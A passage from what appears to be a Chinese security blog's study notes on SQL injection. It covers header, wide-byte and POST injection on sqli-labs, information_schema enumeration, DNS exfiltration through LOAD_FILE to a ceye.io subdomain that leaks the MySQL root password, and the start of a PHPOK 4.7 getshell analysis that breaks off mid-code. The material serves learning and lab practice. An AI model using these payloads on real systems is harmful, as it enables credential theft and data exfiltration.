函数</strong></h4><p><strong>语法：updatexml(目标xml文档，xml路径，更新的内容)</strong></p><p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询语句！</p><p>(0x7e其实代表着16进制的”~”号，转换成16进制其实是为了过一些过滤，使得代码”兼容性”更高，<strong>其实~是为了让语法报错，让我们插入的子查询执行并通过报错带出来</strong>，其实只要能让语法错误的标点符号其实都是可以的)</p><p>也可以使用extractvalue（）函数，但低版本的mysql好像不支持这个函数；</p><h3 id="我们通过modheard这个插件来对user-agent进行修改"><a href="#我们通过modheard这个插件来对user-agent进行修改" class="headerlink" title="我们通过modheard这个插件来对user-agent进行修改"></a>我们通过modheard这个插件来对user-agent进行修改</h3><hr><p>我们先修改user-agent进行测试</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/q6bMPnwd5Da7o6uJLlJ1.yBautUyB39Idb5j8P42WaU!/b/dL8AAAAAAAAA&amp;bo=*QPdAAAAAAADBwE!&amp;rf=viewer_4" alt></p><p>发现插入成功！</p><p>那么我们就来开始构造payload进行注入：</p><ul><li>先查询数据库名：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select database())),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p>1’闭合前面，后面的两对闭合单引号是为了补充’$IP’, $uname两个数据位置；在将数据库后面语句注释掉</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/h5wItQlyqSf8q*fWEBZbyuxarCM9MsOS.gkgBK0AFo0!/b/dL4AAAAAAAAA&amp;bo=igSPAAAAAAADFzM!&amp;rf=viewer_4" alt></p><ul><li>查询表名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/6dP8GqUgFPrBrmBaR2CUU0UPLq4cOpZe1BXSsvGGRjs!/b/dFQBAAAAAAAA&amp;bo=PwZoAAAAAAADF2M!&amp;rf=viewer_4" alt></p><ul><li>查询字段名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/1*jz.Je1g7Y*Ky6011XcNEhXaffD0Mr6HN4hV9JpoLg!/b/dFYBAAAAAAAA&amp;bo=VwZ1AAAAAAADFxY!&amp;rf=viewer_4" alt></p><ul><li>爆用户名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.UxMQ7MiXCRxXQl1xnmZtDYwcUwVV8wZTNeYe0QlnII!/b/dL8AAAAAAAAA&amp;bo=8wTCAAAAAAADFwc!&amp;rf=viewer_4" alt></p><p>爆密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></p><p> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/pAockMgFEAkgsrRs7qt12dZT3QgONi0fXpuStLt3Ils!/b/dDcBAAAAAAAA&amp;bo=hQTRAAAAAAADF2I!&amp;rf=viewer_4" alt></p><p>这样一次head头的注入就这样完成了，而后面靶场的head注入其实也是对其他head头（referer、cookie）进行注入而已，而注入的方法多种多样……</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2019/12/07/sqlkzj/"/>
      <url>/2019/12/07/sqlkzj/</url>
      
        <content type="html"><![CDATA[<h3 id="宽字节sql注入的原理"><a href="#宽字节sql注入的原理" class="headerlink" title="宽字节sql注入的原理"></a>宽字节sql注入的原理</h3><p>gbk使用的是双字节编码,而utf8则是三字节。</p><ol><li><p>宽字节注入原因是设置的数据库编码和php编码是两个不同的编码，就可能产生宽字节注入漏洞</p></li><li><p>如果php编码为utf8,而sql语句set names gbk 这样配置可能会导致编码在转换时出现注入漏洞。</p></li><li><p>set names x.就等同设置了数据库连接，发出，接收的编码<br>(宽字节sql注入就是php在发送数据到数据库过程中使用了语句进行set names gbk或set claracter_set_client=gbk,但由于被一些字符集转换而导致宽字节注入)</p></li></ol><p>先引入一个php函数:</p><h3 id="megic-quotes-gpc-魔术信号开关"><a href="#megic-quotes-gpc-魔术信号开关" class="headerlink" title="megic_quotes_gpc(魔术信号开关):"></a><strong>megic_quotes_gpc(魔术信号开关):</strong></h3><p>当php传参时<strong>有特殊字符就会在前面加”\”来转译字符</strong> 来过滤，比如单引号，双引号，反斜线，null字符等都会被转义。(会对特殊字符进行转义)<br>在php作用是 <strong>判断解析用户输入的数据</strong>，包括post, get , cookie传过来的<strong>可疑数据增加转义字符</strong>如”\”,减少可疑数据对程序和数据库的影响而导致出错。 就是说<strong>如果有特殊字符，他就会在前面加一个反斜杠来进行过滤</strong>，那我们该如何绕过呢？</p><h2 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a><strong>绕过原理：</strong></h2><p>在gbk编码中，\的编码为%5c,而中文字符”运”的编码为%df%5c,那么我们可不可以在这里做文章呢？</p><p>我们在使用引号去测试注入的时候，可能会被\转义:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=1\&apos;&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p>被转义使我们无法进行注入，那我们能不能使用%df去和\编码%5c结合，变成一个运字，使得单引号闭合，’逃过’了被转义的命运。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1%df%5c&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>转义变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1运&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>转义后执行sql语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1运&apos; union select 1,user()#&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p>这是因为php和mysql使用了两种编码，使转码过程中出现漏洞。<br>如果我们输入%df”,而php的魔术引号会强制的转换”，在前面加反斜杠\”，而\等于%5c,则代码成为% df%5c”，而%df%5c编码为运字，变成运”，从而\转义字符被合并了，(从而绕过转义。)</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>post注入</title>
      <link href="/2019/12/07/sql2/"/>
      <url>/2019/12/07/sql2/</url>
      
        <content type="html"><![CDATA[<h3 id="post注入的介绍"><a href="#post注入的介绍" class="headerlink" title="post注入的介绍"></a>post注入的介绍</h3><p>post注入也是sql注入的一种类型，通过post进行传参的注入，post传参一般是通过表单的方式提交，但本质上和get注入没有多大的区别。通过伪造插入修改语句，使得用户插入的数据也被当成sql代码去执行。</p><h3 id="post注入的高危点"><a href="#post注入的高危点" class="headerlink" title="post注入的高危点**"></a>post注入的高危点**</h3><ul><li>网页登陆框</li><li>网页查询框</li><li>与数据库有交互的提交框</li></ul><p>一般情况下，当我们通过HTML表单提交数据到服务器时，服务端都会在数据库中检查我们输入的数据是否符合要求，然后根据数据库搜索结果返回相应的数据给客户端，但如果我们能控制输入，构造一些“恶意”的SQL语句，“欺骗”后台数据库执行系统不愿意用户执行的操作，那么就产生了SQL注入。这就是我们常说的POST注入。</p><p><strong>这里以sqli-less-11做post注入例题讲解：</strong></p><p>我们点进去，看到一张登陆的表单，我们思考一下应该如何进行注入</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/IQ8PuQYXRfQeKFbKXgUUpLG8c0u9bRyDxpMCb8JUO7A!/b/dLkAAAAAAAAA&amp;bo=3wSdAQAAAAADB2U!&amp;rf=viewer_4" alt></p><p>我们先通过用一个单引号在username上进行测试，发现出现错误信息，结果显示是对’的处理所产生的错误<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.s0IqEEnc82GeYcsj6bUgw654mtuR57kW6RYZGKKnYU!/b/dFYBAAAAAAAA&amp;bo=8AWAAAAAAAADF0c!&amp;rf=viewer_4" alt></p><p>我们通过闭合’,在再后面加上or 1=1再将后面注释掉，竟然发现登陆了进去<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/kb0Ha8Mr6gvwbdZjJfLhBBPpydpnzihcImL2JKqDjP8!/b/dLYAAAAAAAAA&amp;bo=MwY0AgAAAAADJwE!&amp;rf=viewer_4" alt></p><p>这是为什么呢？显而易见，or ’1’ = ‘1’恒为真，而且#后面的密码直接被注释了，那么我们可以直接登录到后台了。<br>那我们能不能通过构造 get 注入中用到的其他的语句代替 or 1=1 进行注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 3#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4LkCwAdfoqRthpNHMTnA.EeKDTK*IDTWRjU7*WDKHX4!/b/dLYAAAAAAAAA&amp;bo=tgQRAgAAAAADJ6M!&amp;rf=viewer_4" alt><br>登陆失败，显示报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 2#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n8nIF5JiU1*uydG*pNEl36opJ4RjWDONYFA.ivtECCE!/b/dL8AAAAAAAAA&amp;bo=lAS0AQAAAAADJyc!&amp;rf=viewer_4" alt><br>登陆失败，无显示,说明字段为2。</p><p>我们尝试下猜数据库版本：<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/cdMGniPDlkmYnllHrJ8gvx8RMgPKV7bG.DcxpiXeJj8!/b/dFQBAAAAAAAA&amp;bo=jwGZAAAAAAADFyU!&amp;rf=viewer_4" alt></p><p>发现不仅登陆成功，并爆出了版本号<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/49Ye2S7pk7SkFSpT1If6A2IfwjT24AjCvEEdme0Plwg!/b/dFQBAAAAAAAA&amp;bo=QgPcAAAAAAADF68!&amp;rf=viewer_4" alt></p><p>这时的sql语句如下：<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/GQZ9l8h2oJXVpEu6vbrD87kOiB1DuduyH7aVTXGPsUQ!/b/dL4AAAAAAAAA&amp;bo=LAdfAAAAAAADF0Y!&amp;rf=viewer_4" alt><br>去数据库查询了username=1，但查询不到，则联合查询了后面的语句，爆出了数据库版本5.5.53；</p><p>在爆出数据库<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JClWQRPGxeIFbUauSoQ2SczVYuSJmlM5JW.2AyJPhNY!/b/dLgAAAAAAAAA&amp;bo=RQfGAQAAAAADB6c!&amp;rf=viewer_4" alt></p><p>再通过系统库爆出表，字段，来进一步进行注入！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入原理分析</title>
      <link href="/2019/12/07/sql1/"/>
      <url>/2019/12/07/sql1/</url>
      
        <content type="html"><![CDATA[<h2 id="sql-injection介绍："><a href="#sql-injection介绍：" class="headerlink" title="sql injection介绍："></a>sql injection介绍：</h2><hr><p>我们称之为 sql 注入。何为 sql，英文：Structured Query Language，<br>叫做结构化查询语言。常见的结构化数据库有 MySQL，MS SQL ,Oracle 以及 Postgresql。Sql<br>语言就是我们在管理数据库时用到的一种。在我们的应用系统使用 sql 语句进行管理应用数<br>据库时，往往<code>采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接 sql 语句的<br>时候，我们可以改变 sql 语句。从而让数据执行我们想要执行的语句</code>，这就是我们常说的sql注入。</p><h2 id="sql注入原理："><a href="#sql注入原理：" class="headerlink" title="sql注入原理："></a>sql注入原理：</h2><hr><p><strong>sql注入攻击的原理</strong></p><p>就是将用户输出的数据当成代码然后被服务器放到数据库上去执行了。</p><p><strong>sql注入实现的两大条件</strong></p><p>1.用户能够控制输出.</p><p>2.原本程序要执行的代码，拼接了用户输入的数据</p><p><strong>SQL注入攻击的典型手段</strong></p><ol><li>判断应用程序是否存在注入漏洞</li><li>收集信息、并判断数据库类型</li><li>根据注入参数类型，重构SQL语句的原貌</li><li>猜解表名、字段名</li><li>获取账户信息、攻击web或为下一步攻击做准备</li></ol><p><strong>information_schema库</strong></p><p>information_schema库是php5.0以后自动生成的系统库，通常我们可以通过系统库查询到很多信息，比如information_schema库里面的tables表中就放着所有的表名，information_schema库里面的columns表放着所有列名。而数据库我们可以通过database()函数爆出也可以通过系统库的schemata库去查询。我们知道以上信息，就可以通过sql语句一步步爆出数据库隐密信息！</p><p><strong>一般的流程为：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&quot;数据库名&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&quot;表名&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表</span><br></pre></td></tr></table></figure><p><strong><em>SQL注入是怎么产生的？</em></strong></p><ol><li><p>WEB开发人员无法保证所有的输入都已经过滤</p></li><li><p>攻击者利用发送给SQL服务器的输入参数构造可执行的SQL代码（可加入到get请求、post请求、http头信息、cookie中）</p></li><li><p>数据库未做相应的安全配置</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql-dns注入</title>
      <link href="/2019/12/07/sql-dnslog/"/>
      <url>/2019/12/07/sql-dnslog/</url>
      
        <content type="html"><![CDATA[<h2 id="dns注入的使用场景："><a href="#dns注入的使用场景：" class="headerlink" title="dns注入的使用场景："></a>dns注入的使用场景：</h2><p>在某些无法直接利用注入漏洞获得回显的情况下，但目标还是可以发起dns请求，这个时候我们就可以通过dns解析把获得的数据外带出去。</p><p>对于sql盲注通常是使用二分法去一步步猜，但是此方法繁琐不说，而且因为不断向服务器发送数据请求，而导致被ban，所以我们可以通过select<br>到的数据发送到一个url上，利用dns解析产生的记录日志来查看数据；</p><h2 id="dns使用函数解析："><a href="#dns使用函数解析：" class="headerlink" title="dns使用函数解析："></a>dns使用函数解析：</h2><ul><li><strong>load_file:</strong></li></ul><p>这是一个用来读取文件的函数（必须是root权限），读取文件并返回文件内容为字符串。要使用此函数，文件<strong>必须位于服务器主机上</strong>，必须<strong>指定完整路径的文件</strong>，而且<strong>必须有FILE权限</strong>。 该文件所有字节可读，但文件内容必须小于max_allowed_packetx(限制server接收数据包大小函数，默认是1MB)。<br>如果<strong>该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</strong><br>在MySQL5.0.19，character_set_filesystem系统变量控制文件名的解释，即仅作文字字符串。</p><hr><p><a href="http://ceye.io是一个免费的dnslog平台，（里面提供了如何操作和注入paylod）" target="_blank" rel="noopener">http://ceye.io是一个免费的dnslog平台，（里面提供了如何操作和注入paylod）</a></p><p>平台所给出的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.yluzfg.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure></p><p>执行之后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\root.yluzfg.ceye.io\abc&apos;)</span><br></pre></td></tr></table></figure><p>concat其实我们已经了解过了，通过他来拼接字符串。<br>而前面的\将后面的\转义了，所以只剩下两个’\’</p><p>而\开头加上网络路径正好形成了一个unc路径，这种也叫UNC路径访问法<br>通过命令去访问网上邻居。</p><p>实际上这句语句是数据库执行去访问root.yluzfg.ceye.io的共享文件夹abc，而ceye.io的子域名解析都是在某些服务器，然后记录了有人请求访问了root.yluzfg.ceye.io，然后通过日志在ceye这个平台上面显示出来了。</p><p>我们可以通过构造payloads来通过dns解析产生的记录日志并传到yece.io查询我们需要的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;)))#</span><br></pre></td></tr></table></figure><p>在通过ceye去查看我们所爆出的信息；<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/jP2FMP6IcA.s0t78L8v1AAEErEAqFFyX3mGTVvy9g8Y!/b/dL4AAAAAAAAA&amp;bo=lAOBAAAAAAADBzQ!&amp;rf=viewer_4" alt></p><p>就这样，通过一步步爆出数据库、表、字段等关键信息，对于有多个值，我们也可以通过移动偏移去一个个查看；</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPOK 4.7从注入到getshell</title>
      <link href="/2019/12/07/PHPOK%204.7%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0getshell/"/>
      <url>/2019/12/07/PHPOK%204.7%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>phpok是一款PHP开发的开源企业网站系统。<br>在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。<br>目前官方最新版已经修补。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在/framework/www/upload_control.php中第61行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private function upload_base($input_name=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;图片存储失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $rs[&quot;status&quot;] = &quot;ok&quot;;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是一个文件上传函数，然后在该函数开头又调用了getfile函数，跟进:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function getfile($input=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$input)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;content&apos;=&gt;P_Lang(&apos;未指定表单名称&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_cate($cateid);</span><br><span class="line">        if(isset($_FILES[$input]))&#123;</span><br><span class="line">            $rs = $this-&gt;_upload($input);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $rs = $this-&gt;_save($input);</span><br><span class="line">        &#125;</span><br><span class="line">        if($rs[&apos;status&apos;] != &apos;ok&apos;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $rs[&apos;cate&apos;] = $this-&gt;cate;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果存在上传文件就调用_upload函数，继续跟进:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">private function _upload($input)</span><br><span class="line">    &#123;</span><br><span class="line">        global $app;</span><br><span class="line">        $basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">        $chunk = $app-&gt;get(&apos;chunk&apos;,&apos;int&apos;);</span><br><span class="line">        $chunks = $app-&gt;get(&apos;chunks&apos;,&apos;int&apos;);</span><br><span class="line">        if(!$chunks)&#123;</span><br><span class="line">            $chunks = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        $tmpname = $_FILES[$input][&quot;name&quot;];</span><br><span class="line">        $tmpid = &apos;u_&apos;.md5($tmpname);</span><br><span class="line">        $ext = $this-&gt;file_ext($tmpname);</span><br><span class="line">        $out_tmpfile = $this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$chunk;</span><br><span class="line">        if (!$out = @fopen($out_tmpfile.&quot;.parttmp&quot;, &quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $error_id = $_FILES[$input][&apos;error&apos;] ? $_FILES[$input][&apos;error&apos;] : 0;</span><br><span class="line">        if($error_id)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;$this-&gt;up_error[$error_id]);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!is_uploaded_file($_FILES[$input][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;上传失败，临时文件无法写入&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$in = @fopen($_FILES[$input][&quot;tmp_name&quot;], &quot;rb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输入流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">            fwrite($out, $buff);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        @fclose($in);</span><br><span class="line">        $app-&gt;lib(&apos;file&apos;)-&gt;mv($out_tmpfile.&apos;.parttmp&apos;,$out_tmpfile.&apos;.part&apos;);</span><br><span class="line">        $index = 0;</span><br><span class="line">        $done = true;</span><br><span class="line">        for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">            if (!file_exists($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&quot;.part&quot;) ) &#123;</span><br><span class="line">                $done = false;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$done)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;&apos;上传的文件异常&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        $outfile = $this-&gt;folder.$basename.&apos;.&apos;.$ext;</span><br><span class="line">        if(!$out = @fopen($this-&gt;dir_root.$outfile,&quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(flock($out,LOCK_EX))&#123;</span><br><span class="line">            for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">                if (!$in = @fopen($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&apos;.part&apos;,&apos;rb&apos;))&#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">                    fwrite($out, $buff);</span><br><span class="line">                &#125;</span><br><span class="line">                @fclose($in);</span><br><span class="line">                